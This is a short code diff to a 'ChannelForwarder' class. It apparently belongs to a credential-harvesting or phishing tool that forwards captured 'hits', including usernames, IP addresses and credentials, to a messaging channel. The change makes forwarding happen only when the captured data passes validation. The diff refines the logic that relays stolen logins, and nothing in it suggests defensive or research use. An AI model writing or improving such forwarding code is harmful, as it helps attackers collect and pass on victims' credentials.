@@ -163,14 +163,13 @@ class ChannelForwarder {
       ipAddress
     });
 
-    // Forward every VALID hit. Use full message when capture meets requirements; otherwise send fallback (VALID + creds).
+    // Forward only when capture meets guard criteria.
     const validation = capture ? this.validateCaptureData(capture) : { valid: false, reason: 'no capture data' };
-    const useFullMessage = validation.valid;
-
-    if (!useFullMessage) {
-      log.debug(`Forwarding VALID with fallback message: ${validation.reason}`, {
+    if (!validation.valid) {
+      log.debug(`Skipping forward: ${validation.reason}`, {
         username: username.substring(0, 5) + '***'
       });
+      return;
     }
 
     // Atomically reserve a forward slot to prevent duplicate channel posts
